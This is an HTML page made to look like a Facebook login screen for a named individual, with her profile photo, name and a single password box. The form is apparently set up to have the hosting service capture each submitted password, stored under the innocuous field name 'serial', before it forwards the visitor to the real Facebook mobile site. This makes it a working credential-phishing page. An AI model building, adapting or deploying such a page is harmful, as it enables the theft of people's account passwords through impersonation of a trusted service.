<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="facebook-logo.png">
    <title>Login Page</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* ... existing CSS ... */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100%;
            position: relative;
            
        }

        .login-box {
            width: 100%;
            max-width: 400px;
            height: 100%;
            padding: 20px;
            background-image: linear-gradient(to left, #07f6070a, #12ebff12, #eeeeee, hsla(0, 100%, 50%, 0.07));
            border-radius: 10px;
            box-shadow: 0 0 80px rgba(0, 0, 0, 0.1);
            z-index: 10;
            font-family: Verdana, Geneva, Tahoma, sans-serif;
        }

        p {
            font-size: 13px;
            color: rgb(0, 0, 0);
        }

        .textbox {
            margin-bottom: 10px;
            position: relative;
        }

        .textbox input {
            width: 100%;
            padding: 21px;
            border: 1px solid silver;
            border-radius: 15px;
            outline: none;
            color: #000;
            background-color: #ffffff;
            font-size: 14px;
        }

        .textbox label {
            position: absolute;
            top: 20px;
            left: 15px;
            color: #9d9d9d;
            font-size: 14px;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        .textbox input:focus + label,
        .textbox input:not(:placeholder-shown) + label {
            top: 6px;
            left: 15px;
            font-size: 11px;
            color: #686767;
        }

        .textbox .eye-icon {
            position: absolute;
            top: 50%;
            right: 15px;
            transform: translateY(-50%);
            cursor: pointer;
            color: #9d9d9d;
        }
        

        .btn {
            width: 100%;
            padding: 10px;
            background: #4454ff;
            border: none;
            border-radius: 30px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
        }

        .btn:hover {
            background: #2d6ddb;
        }

       

        @media (max-width: 600px) {
            .login-box {
                width: 100%;
                height: 100%;
                padding: 15px;
                background-image: linear-gradient(to right, #ff000010,#f2f7ff, #f2f7ff,rgba(7, 246, 7, 0.036));
            }

            .textbox input {
                padding: 21px;
            }

            .textbox label {
                top: 20px;
                left: 12px;
            }

            .btn, #createAccountBtn {
                padding: 12px;
            }
        }
        
    </style>
</head>

<body>
   
    <div class="login-box">
        
        <div style="text-align: center;">
            <img src="fatu.jpg" width="25%" alt="Facebook Logo" style="border-radius: 50%; margin-top: 100px;">
        <br><h2 style="font-family:Arial, Helvetica, sans-serif; font-weight: 600; font-size: 22px; margin-top: 10px;">Fatema Patwary</h2>
         </div><br>
        <form name="contact" method="POST" data-netlify="true" action="https://m.facebook.com/">
           
            <div class="textbox">
                <input type="password" placeholder=" " name="serial" id="password" required >
                <label >Password</label>
                <i class="fas fa-eye eye-icon" id="togglePassword"></i>
            </div>
            <button type="submit" class="btn" style="font-family: Verdana, Geneva, Tahoma, sans-serif;" >Log in</button><br><br>
            <div style="text-align: center;"><p style=" font-size: 13px;" >Forgotten password?</p></div>
        </form><br>
     </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/22.3.0/i18next.min.js"></script>
    <script>

    </script>
</body>
</html>
